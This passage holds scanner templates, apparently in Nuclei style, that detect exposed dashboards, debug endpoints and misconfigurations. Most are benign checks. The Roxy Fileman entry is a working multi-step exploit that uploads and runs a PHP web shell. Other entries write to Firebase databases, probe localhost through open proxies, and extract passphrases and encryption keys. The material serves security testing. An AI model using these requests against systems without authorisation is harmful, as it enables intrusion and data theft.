    2. index.newPad
- condition - and

**Type - status**
- status
    1. 200

---
# ServerStatus Exposure
- severity - info
- tags - misconfig,serverstatus
## Requests
- Method - GET
### URL
- {{BaseURL}}
### Matchers

**Type - word**
- part - body
- words
    1. \<title>ServerStatus\</title>

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Sonarqube with public projects
- severity - low
- tags - sonarqube,misconfig
## Requests
- Method - GET
### URL
- {{BaseURL}}/api/components/suggestions?recentlyBrowsed=
### Matchers

**Type - status**
- status
    1. 200

**Type - word**
- words
    1. "results":
    2. "items":
    3. "more":
- part - body
- condition - and

---
# Nginx Dashboard
- severity - low
- tags - misconfig,nginx
## Requests
- Method - GET
### URL
- {{BaseURL}}/dashboard.html
### Matchers

**Type - word**
- words
    1. Nginx+ Dashboard

**Type - status**
- status
    1. 200

---
# Detect MySQLd Exporter
- severity - low
- tags - mysqld,exposure,debug,misconfig
## Requests
- Method - GET
### URL
- {{BaseURL}}/metrics
### Matchers

**Type - word**
- part - body
- words
    1. mysqld
    2. # HELP
- condition - and

**Type - status**
- status
    1. 200

---
# AWStats Listing
## Description
- Searches for exposed awstats Internal Information.
- severity - low
- tags - misconfig,aws,exposure,amazon,awstats,oss
## Requests
- Method - GET
### URL
- {{BaseURL}}/awstats/data
### Matchers

**Type - word**
- part - body
- words
    1. Index of /awstats/data/
    2. ">awstats
- condition - and

**Type - status**
- status
    1. 200

---
# Wavlink Panel - Unauthenticated Access
## Description
- Wavlink Panel was able to be accessed with no authentication requirements in place.
- severity - high
- tags - exposure,wavlink,unauth,misconfig,router
## Requests
- Method - GET
### URL
- {{BaseURL}}/wifi_base.shtml
### Matchers

**Type - word**
- part - body
- words
    1. \<title>APP\</title>

**Type - regex**
- part - body
- regex
    1. var passphraseKey12="(.*)";

**Type - word**
- part - body
- negative - True
- words
    1. var passphraseKey12="";

**Type - status**
- status
    1. 200
### Extractors

**Type - regex**
- part - body
- group - 1
- regex
    1. var passphraseKey12="(.*)";

---
# application.yaml detection
## Description
- Finds Application YAML files which often contain sensitive information.
- severity - info
- tags - misconfig
## Requests
- Method - GET
### URL
- {{BaseURL}}/app.yaml
- {{BaseURL}}/app.yml
- {{BaseURL}}/application.yaml
- {{BaseURL}}/application.yml
### Matchers

**Type - word**
- condition - or
- words
    1. runtime:
    2. spring:
    3. datasource:
    4. platform:
    5. server:
    6. job:

**Type - status**
- status
    1. 200

**Type - dsl**
- condition - or
- dsl
    1. !contains(tolower(body), '\<html')
    2. !contains(tolower(body), '\<body')
    3. !contains(tolower(body), '\</h1>')
    4. !contains(tolower(body), '\</h2>')
    5. !contains(tolower(body), '\</h3>')
    6. !contains(tolower(body), '\<?xml')

---
# Varnish Unauthenticated Cache Purge
## Description
- As per guideline one should protect purges with ACLs from unauthorized hosts.
- severity - low
- tags - misconfig,cache,hackerone,varnish
## Requests
- Method - PURGE

---
# Gitea Public Registration Enabled
## Description
- A misconfiguration in Gitea allows arbitrary users to sign up and read code hosted on the service.

- severity - high
- tags - misconfig,gitea
## Requests
- Method - GET
### URL
- {{BaseURL}}/user/sign_up
### Matchers

**Type - word**
- words
    1. Powered by Gitea Version
    2. Register -
- condition - and

**Type - word**
- part - body
- words
    1. Registration is disabled. Please contact your site administrator.
- negative - True

**Type - status**
- status
    1. 200

---
# PCDN Cache Node Dataset
- severity - low
- tags - node,pcdn,misconfig
## Requests
- Method - GET
### URL
- {{BaseURL}}
### Matchers

**Type - word**
- part - body
- words
    1. Bandwidth
    2. ReportEventID
    3. ReadDiskDuration
- condition - and

**Type - word**
- part - header
- words
    1. application/json

**Type - status**
- status
    1. 200

---
# S3 torrent Downloads Allowed
## Description
- Detects if endpoint allows magic S3 torrent argument to download files
- severity - info
- tags - misconfig,aws,s3,bucket
## Requests
- Method - GET
### URL
- {{BaseURL}}/?torrent
### Matchers

**Type - word**
- part - body
- words
    1. RequestTorrentOfBucketError
    2. s3-tracker
- condition - or

---
# Locust Exposure
- severity - medium
- tags - exposure,locust,misconfig
## Requests
- Method - GET
### URL
- {{BaseURL}}
### Matchers

**Type - word**
- part - body
- words
    1. \<title>Locust\</title>

**Type - word**
- part - body
- words
    1. locust.js
    2. Charts\</a>
- condition - or

**Type - status**
- status
    1. 200

---
# Unauthenticated Selenium Grid Console
- severity - info
- tags - misconfig,unauth,selenium
## Requests
- Method - GET
### URL
- {{BaseURL}}/grid/console
- {{BaseURL}}/console
### Matchers

**Type - word**
- part - body
- words
    1. Grid Console
    2. view config
- condition - and

**Type - status**
- status
    1. 200

---
# CodeMeter Webadmin Dashboard
- severity - low
- tags - misconfig,exposure,codemeter
## Requests
- Method - GET
### URL
- {{BaseURL}}/index.html
### Matchers

**Type - word**
- part - body
- words
    1. WebAdmin | Dashboard
    2. CodeMeter
- condition - and

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# PuppetDB Dashboard Exposure
- severity - low
- tags - misconfig,exposure,puppetdb
## Requests
- Method - GET
### URL
- {{BaseURL}}/pdb/dashboard/index.html
### Matchers

**Type - word**
- part - body
- words
    1. PuppetDB: Dashboard

**Type - status**
- status
    1. 200

---
# Selenium - Node Exposure
## Description
- Selenium was shown to have an exposed node. If a Selenium node is exposed without any form of authentication, remote command execution could be possible if chromium is configured. By default the port is 4444, still, most of the internet facing are done through reverse proxies.

- severity - high
- tags - selenium,misconfiguration,rce,chromium
## Requests
- Method - GET
### URL
- {{BaseURL}}/wd/hub
### Matchers

**Type - word**
- words
    1. WebDriverRequest
    2. \<title>WebDriver Hub\</title>
- condition - or

**Type - status**
- status
    1. 200

---
# Unauthenticated Netdata
- severity - medium
- tags - netdata,unauth,misconfig
## Requests
- Method - GET
### URL
- {{BaseURL}}/api/v1/data?chart=system.cpu&format=json&points=125&group=average&gtime=0&options=ms%7Cflip%7Cjsonwrap%7Cnonzero&after=-120&dimensions=iowait
### Matchers

**Type - status**
- status
    1. 200

**Type - word**
- words
    1. view_update_every
    2. dimensions
- condition - and

**Type - word**
- words
    1. application/json
- part - header

---
# Laravel Debug Enabled
## Description
- Laravel with APP_DEBUG set to true is prone to show verbose errors.

- severity - medium
- tags - debug,laravel,misconfig
## Requests
- Method - GET
### URL
- {{BaseURL}}/_ignition/health-check
### Matchers

**Type - word**
- part - body
- words
    1. can_execute_commands

**Type - status**
- status
    1. 200

---
# GCP/AWS Metadata Disclosure
- severity - low
- tags - misconfig,exposure,devops,cloud,aws,gcp
## Requests
- Method - GET
### URL
- {{BaseURL}}
### Matchers

**Type - word**
- part - body
- words
    1. "instance_metadata":
    2. "cloud":
- condition - and

**Type - status**
- status
    1. 200
### Extractors

**Type - regex**
- part - body
- group - 1
- regex
    1. "cloud":"([A-Z]+)",

---
# Exposed Cobbler Directories
## Description
- Searches for exposed Cobbler Directories
- severity - medium
- tags - cobbler,exposure,misconfig
## Requests
- Method - GET
### URL
- {{BaseURL}}/cobbler/
- {{BaseURL}}/cblr/
### Matchers

**Type - status**
- status
    1. 200

**Type - word**
- part - body
- words
    1. Index of /cobbler
    2. Index of /cblr
- condition - or

---
# Atlassian Bitbucket Public Repository Exposure
- severity - low
- tags - misconfig,bitbucket
## Requests
- Method - GET
### URL
- {{BaseURL}}/repos?visibility=public
- {{BaseURL}}/bitbucket/repos?visibility=public
### Matchers

**Type - word**
- part - body
- words
    1. Public Repositories - Bitbucket

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Envoy Admin Exposure
- severity - medium
- tags - misconfig,envoy,exposure
## Requests
- Method - GET
### URL
- {{BaseURL}}
### Matchers

**Type - word**
- words
    1. \<title>Envoy Admin\</title>

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# QVidium Management System Exposed
- severity - medium
- tags - misconfig,qvidium
## Requests
- Method - GET
### URL
- {{BaseURL}}
### Matchers

**Type - word**
- part - body
- words
    1. QVidium Management
    2. src="/cgi-bin/banner.cgi
- condition - and

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Healthchecks UI Exposure
- severity - low
- tags - misconfig,exposure
## Requests
- Method - GET
### URL
- {{BaseURL}}
### Matchers

**Type - word**
- part - body
- words
    1. Health Checks UI
    2. var webhookEndpoint
- condition - and

**Type - status**
- status
    1. 200

---
# GitList Disclosure
- severity - low
- tags - gitlist,misconfig
## Requests
- Method - GET
### URL
- {{BaseURL}}
### Matchers

**Type - word**
- words
    1. GitList\</title>

**Type - status**
- status
    1. 200

---
# Confluence Dashboard Exposed
- severity - low
- tags - misconfig,exposure,confluence,atlassian
## Requests
- Method - GET
### URL
- {{BaseURL}}
### Matchers

**Type - word**
- part - body
- words
    1. Dashboard - Confluence
    2. title="Spaces">
    3. Atlassian Confluence
- condition - and

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# EC2 Instance Information
- severity - low
- tags - misconfig,ec2,aws,amazon
## Requests
- Method - GET
### URL
- {{BaseURL}}
### Matchers

**Type - word**
- part - body
- words
    1. \<title>EC2 Instance Information\</title>

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# FrontPage configuration information discloure
- severity - info
- tags - misconfig,exposure,frontpage
## Requests
- Method - GET
### URL
- {{BaseURL}}/_vti_inf.html
- {{BaseURL}}/_vti_pvt/service.cnf
### Matchers

**Type - word**
- words
    1. vti_extenderversion:
    2. FPVersion=
- part - body

**Type - status**
- status
    1. 200

---
# Unauthenticated Mercurial Detect
- severity - high
- tags - misconfig,unauth,mercurial
## Requests
- Method - GET
### URL
- {{BaseURL}}
### Matchers

**Type - word**
- part - body
- words
    1. Mercurial Repositories
    2. Last modified
- condition - and

**Type - status**
- status
    1. 200

---
# AMPPS by Softaculous - Directory Listing
- severity - info
- tags - panel,ampps,softaculous,misconfig
## Requests
- Method - GET
### URL
- {{BaseURL}}/client/
- {{BaseURL}}/files/
- {{BaseURL}}/icons/
### Matchers

**Type - word**
- part - body
- words
    1. \<title>[AMPPS] - Web Local\</title>
    2. Powered by AMPPS
- condition - and

**Type - status**
- status
    1. 200

---
# Docmosis Tornado Server Exposure
- severity - low
- tags - misconfig,tornado,exposure
## Requests
- Method - GET
### URL
- {{BaseURL}}
### Matchers

**Type - word**
- part - body
- words
    1. Docmosis Tornado
    2. href="WebServerDownload.css
- condition - and

**Type - status**
- status
    1. 200

---
# Elastic HD Dashboard Exposure
- severity - low
- tags - misconfig,exposure,elastic
## Requests
- Method - GET
### URL
- {{BaseURL}}
### Matchers

**Type - word**
- part - body
- words
    1. Elastic HD Dashboard
    2. elasticsearch go Edition head plugin
- condition - and

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# KubeCost - Unauthenticated Dashboard Exposure
- severity - medium
- tags - misconfig,exposure,unauth,kubecost
## Requests
- Method - GET
### URL
- {{BaseURL}}/overview.html
### Matchers

**Type - word**
- words
    1. \<title>Cluster Overview | Kubecost\</title>

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Roxy Fileman 1.4.4 - Arbitrary File Upload
## Description
- Roxy Fileman 1.4.4 is susceptible to remote code execution via the FORBIDDEN_UPLOADS setting, which is checked when renaming an existing file to a new file extension. An attacker can bypass this check and rename already uploaded files to any extension using the move function, which does not perform any checks.

- severity - high
- tags - intrusive,misconfig,edb,roxy,fileman,rce,fileupload
## Requests
### Step - 1
```
POST /php/upload.php HTTP/1.1
Host: {{Hostname}}
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary6rbEqFAMRkE0RAB7

------WebKitFormBoundary6rbEqFAMRkE0RAB7
Content-Disposition: form-data; name="action"

upload
------WebKitFormBoundary6rbEqFAMRkE0RAB7
Content-Disposition: form-data; name="method"

ajax
------WebKitFormBoundary6rbEqFAMRkE0RAB7
Content-Disposition: form-data; name="d"

/app/Uploads
------WebKitFormBoundary6rbEqFAMRkE0RAB7
Content-Disposition: form-data; name="files[]"; filename="{{randstr}}.jpg"
Content-Type: image/jpeg

<?php
echo exec($_GET["cmd"]);
?>

------WebKitFormBoundary6rbEqFAMRkE0RAB7--

```
### Step - 2
```
POST /php/renamefile.php?f=%2Fapp%2FUploads%2F{{randstr}}.jpg&n={{randstr}}.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest

f=%2Fapp%2FUploads%2F{{randstr}}.jpg&n={{randstr}}.php

```
### Step - 3
```
POST /php/movefile.php?f=%2Fapp%2FUploads%2F{{randstr}}.jpg&n=%2Fapp%2FUploads%2F{{randstr}}.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest

f=%2Fapp%2FUploads%2F{{randstr}}.jpg&n=%2Fapp%2FUploads%2F{{randstr}}.php

```
### Step - 4
```
GET /Uploads/{{randstr}}.php?cmd=echo+"roxyfileman"+|+rev HTTP/1.1
Host: {{Hostname}}

```
### Matchers

**Type - regex**
- part - body
- regex
    1. namelifyxor

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# AWS S3 Explorer
- severity - low
- tags - s3,edb,misconfig,aws,amazon
## Requests
- Method - GET
### URL
- {{BaseURL}}/index.html
### Matchers

**Type - word**
- words
    1. \<title>AWS S3 Explorer\</title>

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Tasmota Configuration Exposure
- severity - medium
- tags - misconfig,tasmota,exposure,config
## Requests
- Method - GET
### URL
- {{BaseURL}}
### Matchers

**Type - word**
- part - body
- words
    1. Firmware
    2. Tasmota
- condition - and
- case-insensitive - True

**Type - word**
- part - body
- words
    1. Theo Arends
    2. \<h2>Tasmota\</h2>
- condition - and
- case-insensitive - True
### Extractors

**Type - regex**
- part - body
- group - 1
- regex
    1. Tasmota ([0-9.]+) 

---
# Express Stack Trace
- severity - low
- tags - misconfig,express
## Requests
- Method - GET
### URL
- {{BaseURL}}/{{randstr}}
### Matchers

**Type - word**
- part - body
- words
    1. NotFoundError: Not Found
    2. at Function.handle
- condition - and

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 404

---
# CoreBos - .htaccess File Exposure
## Description
- CoreBos was discovered to have .htaccess file exposed to public which includes sensitive information.

- severity - info
- tags - exposure,corebos,huntr,misconfig
## Requests
- Method - GET
### URL
- {{BaseURL}}/htaccess.txt
### Matchers

**Type - word**
- part - body
- words
    1. Options -Indexes
    2. \<FilesMatch
- condition - and

**Type - status**
- status
    1. 200

---
# SmarterStats Setup Exposure
- severity - high
- tags - misconfig,smarterstats,exposure
## Requests
- Method - GET
### URL
- {{BaseURL}}/Admin/frmWelcome.aspx
### Matchers

**Type - word**
- part - body
- words
    1. SmarterStats - SmarterStats
    2. Create System Administrator
- condition - and

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# ntop Network Traffix Exposed
- severity - unknown
- tags - misconfig,ntop,exposure
## Requests
- Method - GET
### URL
- {{BaseURL}}
### Matchers

**Type - word**
- part - body
- words
    1. Configure ntop
    2. directory is properly installed
- condition - and

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# SAP Directory Listing
- severity - medium
- tags - sap,listing,misconfig
## Requests
- Method - GET
### URL
- {{BaseURL}}/irj/go/km/navigation/
### Matchers

**Type - word**
- words
    1. title="~system"
    2. NetWeaver
- condition - and

**Type - status**
- status
    1. 200

**Type - word**
- words
    1. text/html
- part - header

---
# Liferay /api/axis - API Exposed
- severity - info
- tags - misconfig,exposure,liferay,api
## Requests
- Method - GET
### URL
- {{BaseURL}}/api/axis
### Matchers

**Type - regex**
- part - body
- regex
    1. .*\<h2>And now\.\.\. Some Services\<\/h2>.*

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Apache Hbase Unauth
- severity - medium
- tags - apache,unauth,misconfig
## Requests
- Method - GET
### URL
- {{BaseURL}}/conf
### Matchers

**Type - word**
- words
    1. \<name>hbase.defaults.for.version\</name>
    2. \<source>hbase-default.xml\</source>

**Type - status**
- status
    1. 200

---
# Apache Storm Unauth
- severity - medium
- tags - apache,unauth,misconfig
## Requests
- Method - GET
### URL
- {{BaseURL}}/api/v1/cluster/summary
### Matchers

**Type - word**
- part - body
- words
    1. "totalMem":
    2. "stormVersion":
- condition - and

**Type - status**
- status
    1. 200

---
# Apache Filename Enumeration
## Description
- If the client provides an invalid Accept header, the server will respond with a 406 Not Acceptable error containing a pseudo directory listing.
- severity - low
- tags - apache,misconfig,hackerone
## Requests
- Method - GET
### URL
- {{BaseURL}}/index
### Matchers

**Type - status**
- status
    1. 406

**Type - word**
- words
    1. Not Acceptable
    2. Available variants:
    3. \<address>Apache Server at
- condition - and

---
# Springboot Scheduledtasks Actuator
## Description
- This endpoint to retrieve the scheduled tasks
- severity - info
- tags - misconfig,springboot,exposure
## Requests
- Method - GET
### URL
- {{BaseURL}}/scheduledtasks
- {{BaseURL}}/actuator/scheduledtasks
### Matchers

**Type - word**
- part - body
- words
    1. cron
    2. fixedDelay
- condition - and

**Type - word**
- part - header
- words
    1. application/json
    2. application/vnd.spring-boot.actuator
    3. application/vnd.spring-boot.actuator.v1+json
    4. application/vnd.spring-boot.actuator.v2+json
- condition - or

**Type - status**
- status
    1. 200

---
# Springboot Liquidbase API
## Description
- This liquibase endpoint provides information about database changes
- severity - low
- tags - misconfig,springboot,exposure,liquibase
## Requests
- Method - GET
### URL
- {{BaseURL}}/liquibase
- {{BaseURL}}/actuator/liquibase
### Matchers

**Type - word**
- part - body
- words
    1. liquibase
    2. "FILENAME":"
- condition - and

**Type - word**
- part - header
- words
    1. application/json
    2. application/vnd.spring-boot.actuator
    3. application/vnd.spring-boot.actuator.v1+json
    4. application/vnd.spring-boot.actuator.v2+json
- condition - or

**Type - status**
- status
    1. 200

---
# Springboot Flyway API
## Description
- This endpoint to retrieve the migrations
- severity - low
- tags - misconfig,springboot,exposure,flyway
## Requests
- Method - GET
### URL
- {{BaseURL}}/flyway
- {{BaseURL}}/actuator/flyway
### Matchers

**Type - word**
- part - body
- words
    1. flywayBeans

**Type - word**
- part - header
- words
    1. application/json
    2. application/vnd.spring-boot.actuator
    3. application/vnd.spring-boot.actuator.v1+json
    4. application/vnd.spring-boot.actuator.v2+json
- condition - or

**Type - status**
- status
    1. 200

---
# Detects Springboot AuditEvents Actuator
- severity - info
- tags - misconfig,springboot,exposure
## Requests
- Method - GET
### URL
- {{BaseURL}}/auditevents
- {{BaseURL}}/actuator/auditevents
### Matchers

**Type - word**
- part - body
- words
    1. {"events":

**Type - word**
- part - header
- words
    1. application/json
    2. application/vnd.spring-boot.actuator
    3. application/vnd.spring-boot.actuator.v1+json
- condition - or

**Type - status**
- status
    1. 200

---
# Detects Springboot LoggerConfig Actuator
- severity - info
- tags - misconfig,springboot,exposure
## Requests
- Method - GET
### URL
- {{BaseURL}}/loggingConfig
- {{BaseURL}}/actuator/loggingConfig
### Matchers

**Type - word**
- part - body
- words
    1. ["loggingConfig"]
    2. "propertySources"
- condition - and

**Type - word**
- part - header
- words
    1. application/json
    2. application/vnd.spring-boot.actuator
    3. application/vnd.spring-boot.actuator.v1+json
- condition - or

**Type - status**
- status
    1. 200

---
# Detects Springboot Logfile Actuator
- severity - low
- tags - misconfig,springboot,exposure
## Requests
- Method - GET
### URL
- {{BaseURL}}/logfile
- {{BaseURL}}/actuator/logfile
- {{BaseURL}}/actuators/logfile
### Matchers

**Type - word**
- part - body
- words
    1. springframework.web.HttpRequestMethodNotSupportedException
    2. INFO
- condition - and

**Type - word**
- part - header
- words
    1. text/plain

**Type - status**
- status
    1. 200

---
# Detects Springboot Features Actuator
- severity - low
- tags - misconfig,springboot,exposure
## Requests
- Method - GET
### URL
- {{BaseURL}}/features
- {{BaseURL}}/actuator/features
### Matchers

**Type - word**
- part - body
- words
    1. "enabled":[
    2. "disabled":[
- condition - and

**Type - word**
- part - header
- words
    1. application/json
    2. application/vnd.spring-boot.actuator
    3. application/vnd.spring-boot.actuator.v1+json
- condition - or

**Type - status**
- status
    1. 200

---
# Springboot Actuator Caches
## Description
- The caches endpoint provides access to the application's caches.
- severity - low
- tags - misconfig,springboot,exposure
## Requests
- Method - GET
### URL
- {{BaseURL}}/caches
- {{BaseURL}}/actuator/caches
### Matchers

**Type - word**
- part - body
- words
    1. cacheManagers

**Type - word**
- part - header
- words
    1. application/json
    2. application/vnd.spring-boot.actuator
    3. application/vnd.spring-boot.actuator.v1+json
    4. application/vnd.spring-boot.actuator.v2+json
- condition - or

**Type - status**
- status
    1. 200

---
# Detect Springboot Trace Actuator
## Description
- View recent HTTP requests and responses
- severity - low
- tags - misconfig,springboot,exposure
## Requests
- Method - GET
### URL
- {{BaseURL}}/trace
### Matchers

**Type - word**
- part - body
- words
    1. "timestamp"
    2. "info"
    3. "method"
    4. "path"
- condition - and

**Type - word**
- part - header
- words
    1. application/json
    2. application/vnd.spring-boot.actuator
    3. application/vnd.spring-boot.actuator.v1+json
- condition - or

**Type - status**
- status
    1. 200

---
# Detects Springboot Jolokia Actuator
- severity - low
- tags - misconfig,springboot,exposure
## Requests
- Method - GET
### URL
- {{BaseURL}}/jolokia
- {{BaseURL}}/actuator/jolokia
### Matchers

**Type - word**
- part - body
- words
    1. "config":{
    2. "agentId":"
- condition - and

**Type - word**
- part - header
- words
    1. application/json
    2. application/vnd.spring-boot.actuator
    3. application/vnd.spring-boot.actuator.v1+json
    4. text/plain
- condition - or

**Type - status**
- status
    1. 200

---
# Detect Springboot Conditions Actuator
- severity - low
- tags - misconfig,springboot,exposure
## Requests
- Method - GET
### URL
- {{BaseURL}}/conditions
- {{BaseURL}}/actuator/conditions
### Matchers

**Type - word**
- part - body
- words
    1. "positiveMatches":{
    2. "unconditionalClasses":[
- condition - and

**Type - word**
- part - header
- words
    1. application/json
    2. application/vnd.spring-boot.actuator
    3. application/vnd.spring-boot.actuator.v1+json
- condition - or

**Type - status**
- status
    1. 200

---
# Detects Springboot Status Actuator
- severity - info
- tags - misconfig,springboot,exposure
## Requests
- Method - GET
### URL
- {{BaseURL}}/status
- {{BaseURL}}/actuator/status
### Matchers

**Type - word**
- part - body
- words
    1. "freeMemory":
    2. "maxMemory":
- condition - and

**Type - status**
- status
    1. 200

---
# Jenkins Open User registration
## Description
- The Jenkins allows registering a new user and accessing the dashboard.
- severity - medium
- tags - misconfig,jenkins,apache,tomcat
## Requests
- Method - GET
### URL
- {{BaseURL}}/signup
### Matchers

**Type - word**
- part - body
- words
    1. Create an account! [Jenkins]

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# GoCd Encryption Key
- severity - low
- tags - go,gocd,exposure,misconfig
## Requests
- Method - GET
### URL
- {{BaseURL}}/go/add-on/business-continuity/api/cipher.aes
### Matchers

**Type - status**
- status
    1. 200

**Type - regex**
- regex
    1. ([a-z0-9]){32}

**Type - word**
- part - header
- words
    1. text/plain
### Extractors

**Type - regex**
- regex
    1. ([a-z0-9]){32}

---
# GoCd Unauth Dashboard
- severity - medium
- tags - go,gocd,unauth,misconfig
## Requests
- Method - GET
### URL
- {{BaseURL}}/go/admin/pipelines/create?group=defaultGroup
### Matchers

**Type - word**
- words
    1. \<title>Create a pipeline - Go\</title>

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# GoCd Cruise Configuration disclosure
- severity - high
- tags - go,gocd,config,exposure,misconfig
## Requests
- Method - GET
### URL
- {{BaseURL}}/go/add-on/business-continuity/api/cruise_config
### Matchers

**Type - status**
- status
    1. 200

**Type - word**
- words
    1. server agentAutoRegisterKey
    2. webhookSecret
    3. tokenGenerationKey
- condition - and

---
# Ampache Debug Page
- severity - info
- tags - misconfig,ampache,debug
## Requests
- Method - GET
### URL
- {{BaseURL}}
- {{BaseURL}}/test.php?action=config
### Matchers

**Type - word**
- part - body
- words
    1. Ampache Debug

**Type - status**
- status
    1. 200

---
# GitHub Debug Page
- severity - info
- tags - misconfig,github,debug
## Requests
- Method - GET
### URL
- {{BaseURL}}
### Matchers

**Type - word**
- part - body
- words
    1. GitHub Debug

**Type - status**
- status
    1. 200

---
# Nginx Status Page
- severity - info
- tags - misconfig,nginx,status
## Requests
- Method - GET
### URL
- {{BaseURL}}/nginx_status
- {{BaseURL}}/nginx-status
### Matchers

**Type - word**
- words
    1. Active connections:

**Type - status**
- status
    1. 200

---
# Nginx Vhost Traffic Status
- severity - low
- tags - status,nginx,misconfig
## Requests
- Method - GET
### URL
- {{BaseURL}}/status
### Matchers

**Type - word**
- words
    1. Nginx Vhost Traffic Status
    2. Host
    3. Zone
- condition - and

**Type - status**
- status
    1. 200

---
# Confluence OAuth Administration Endpoint
- severity - info
- tags - misconfig,jira,confluence,atlassian
## Requests
- Method - GET
### URL
- {{BaseURL}}/plugins/servlet/oauth/view-consumer-info
- {{BaseURL}}/confluence/plugins/servlet/oauth/view-consumer-info
### Matchers

**Type - word**
- words
    1. \<title>OAuth Consumer Information
    2. OAuth Administration

**Type - status**
- status
    1. 200

---
# Insecure Firebase Database
## Description
- If the owner of the app have set the security rules as true for both "read" & "write" an attacker can probably dump database and write his own data to firebase database.
- severity - high
- tags - firebase,google,misconfig
## Requests
### Step - 1
```
PUT /{{randstr}}.json HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json

{"id":"insecure-firebase-database"}

```
### Step - 2
```
GET /{{randstr}}.json HTTP/1.1
Host: {{Hostname}}

```
### Matchers

**Type - word**
- part - body_2
- words
    1. {"id":"insecure-firebase-database"}

**Type - status**
- status
    1. 200

---
# GitLab - User Information Disclosure Via Open API
- severity - medium
- tags - gitlab,enum,misconfig,disclosure
## Requests
### Step - 1
```
GET /api/v4/users/{{uid}} HTTP/1.1
Host: {{Hostname}}
Accept: application/json, text/plain, */*
Referer: {{BaseURL}}

```
### Matchers

**Type - regex**
- part - body
- condition - and
- regex
    1. username.*
    2. id.*
    3. name.*

**Type - word**
- part - header
- words
    1. application/json

**Type - status**
- status
    1. 200

**Payloads**- uid

---
# GitLab public signup
- severity - info
- tags - gitlab,misconfig
## Requests
- Method - GET
### URL
- {{BaseURL}}/users/sign_in
### Matchers

**Type - word**
- words
    1. \<a data-qa-selector="register_link" href="/users/sign_up">Register now\</a>
    2. data-qa-selector="new_user_register_button"

**Type - word**
- words
    1. https://about.gitlab.com

**Type - status**
- status
    1. 200

**Type - word**
- negative - True
- words
    1. \<meta content="GitLab.com" property="og:description">

---
# GitLab - User Enumeration
- severity - info
- tags - gitlab,enum,misconfig,fuzz
## Requests
### Step - 1
```
GET /users/{{user}}/exists HTTP/1.1
Host: {{Hostname}}
Accept: application/json, text/plain, */*
Referer: {{BaseURL}}

```
### Matchers

**Type - regex**
- part - body
- regex
    1. exists.*:true

**Type - status**
- status
    1. 200

**Type - word**
- part - header
- words
    1. application/json

**Payloads**- user

---
# GitLab public repositories
- severity - info
- tags - gitlab,exposure,misconfig
## Requests
- Method - GET
### URL
- {{BaseURL}}/api/v4/projects
### Matchers

**Type - word**
- part - header
- words
    1. Set-Cookie: _gitlab_session=

**Type - word**
- part - body
- words
    1. name_with_namespace

---
# GitLab public snippets
- severity - info
- tags - gitlab,exposure,misconfig
## Requests
- Method - GET
### URL
- {{BaseURL}}/explore/snippets
- {{BaseURL}}/-/snippets
### Matchers

**Type - word**
- words
    1. \<title>Snippets · Explore · GitLab\</title>

**Type - status**
- status
    1. 200

**Type - word**
- negative - True
- condition - or
- words
    1. No snippets found
    2. Nothing here.

---
# Uninitialized GitLab instances
## Description
- Prior to version 14, GitLab installations required a root password to be
set via the web UI. If the administrator skipped this step, any visitor
could set a password and control the instance.

- severity - high
- tags - gitlab,misconfig,unauth
## Requests
- Method - GET
### URL
- {{BaseURL}}/users/sign_in
### Matchers

**Type - word**
- part - body
- words
    1. Change your password
    2. New password
    3. Confirm new password
- condition - and

**Type - word**
- part - header
- words
    1. gitlab_session

**Type - status**
- status
    1. 200

---
# Open Proxy to Ports on the Proxy's localhost Interface
## Description
- The host is configured as a proxy which allows access to its internal interface
- severity - high
- tags - exposure,config,proxy,misconfig,fuzz
## Requests
### Step - 1
```
GET / HTTP/1.1
Host: {{Hostname}}


```
### Step - 2
```
GET http://somethingelsethatdoesnotexist/ HTTP/1.1
Host: somethingelsethatdoesnotexist


```
### Step - 3
```
GET http://127.0.0.1:21 HTTP/1.1
Host: 127.0.0.1


```
### Step - 4
```
GET http://127.0.0.1:22 HTTP/1.1
Host: 127.0.0.1


```
### Step - 5
```
GET http://127.0.0.1:25 HTTP/1.1
Host: 127.0.0.1


```
### Step - 6
```
GET http://127.0.0.1:110 HTTP/1.1
Host: 127.0.0.1


```
### Step - 7
```
GET http://127.0.0.1:587 HTTP/1.1
Host: 127.0.0.1


```
### Step - 8
```
GET https://127.0.0.1:587 HTTP/1.1
Host: 127.0.0.1


```
### Matchers

**Type - dsl**
- condition - or
- dsl
    1. (!regex("(?i)FTP",body_1)) && (!regex("(?i)FTP",body_2)) && (regex("(?i)FTP",body_3))
    2. (!regex("(?i)SSH-[.]+-+",body_1)) && (!regex("(?i)SSH-[.]+-+",body_2)) && (regex("(?i)SSH-[.]+-+",body_4))
    3. (!regex("(?i)POP3",body_1)) && (!regex("(?i)POP3",body_2)) && (regex("(?i)POP3",body_6))
    4. (!regex("(?i)SMTP",body_1)) && (!regex("(?i)SMTP",body_2)) && ((regex("(?i)SMTP",body_5)) || (regex("(?i)SMTP",body_7)) || (regex("(?i)SMTP",body_8)))

---
# Microsoft Azure Cloud Metadata Service Check
## Description
- The Microsoft Azure cloud host is configured as a proxy which allows access to the instance metadata service. This could allow significant access to the host/infrastructure.
- severity - critical
